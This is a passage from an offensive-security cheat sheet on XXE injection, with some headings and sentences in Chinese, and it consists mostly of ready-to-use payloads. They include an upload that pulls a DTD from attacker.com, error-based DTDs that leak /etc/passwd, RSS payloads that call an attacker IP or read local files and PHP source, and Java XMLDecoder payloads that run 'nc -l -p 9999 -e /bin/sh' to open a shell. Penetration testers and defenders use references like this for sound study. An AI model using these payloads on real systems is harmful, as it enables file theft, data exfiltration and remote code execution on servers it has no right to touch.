### Exfiltrating Data via Out of Band

```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```

Based on the displayed User Agent returned by burp collaborator, it appears that it is using **Java 1.8**. One of the problems when exploiting XXE on this version of Java is **we’re unable to obtain the files containing a `New Line`** such as `/etc/passwd` using the Out of Band technique.

### Exfiltrating Data via Error Based

DTD File:

```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```

Server Response:

```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```

Great! The `non-exist` file is reflected in the Error messages. Next is adding the File Content.

DTD File:

```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```

And the content of the file was successfully **printed in the output of the error sent via HTTP**.

## RSS - XEE

具有 RSS 格式的有效 XML 以利用 XXE 漏洞。

### Ping back

Simple HTTP request to attackers server

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```

### Read file

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```

### Read source code

Using PHP base64 filter

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```

## Java XMLDecoder XEE to RCE

XMLDecoder 是一个基于 XML 消息创建对象的 Java 类。如果恶意用户可以在调用**readObject**方法时让应用程序使用任意数据，将可在服务器上的代码执行。

### Using Runtime().exec()

```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec">
      <array class="java.lang.String" length="6">
          <void index="0">
              <string>/usr/bin/nc</string>
          </void>
          <void index="1">
              <string>-l</string>
          </void>
          <void index="2">
              <string>-p</string>
          </void>
          <void index="3">
              <string>9999</string>
          </void>
          <void index="4">
              <string>-e</string>
          </void>
          <void index="5">
              <string>/bin/sh</string>
          </void>
      </array>
      </void>
 </object>
</java>
```

### ProcessBuilder

```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="6">
      <void index="0">
        <string>/usr/bin/nc</string>
      </void>
      <void index="1">
         <string>-l</string>
      </void>
      <void index="2">
         <string>-p</string>
      </void>
      <void index="3">
         <string>9999</string>
      </void>
      <void index="4">
         <string>-e</string>
      </void>
      <void index="5">
         <string>/bin/sh</string>
      </void>
    </array>
    <void method="start" id="process">
    </void>
  </void>
</java>
```

## Tools

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## More resources

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
Extract info via HTTP using own external DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)
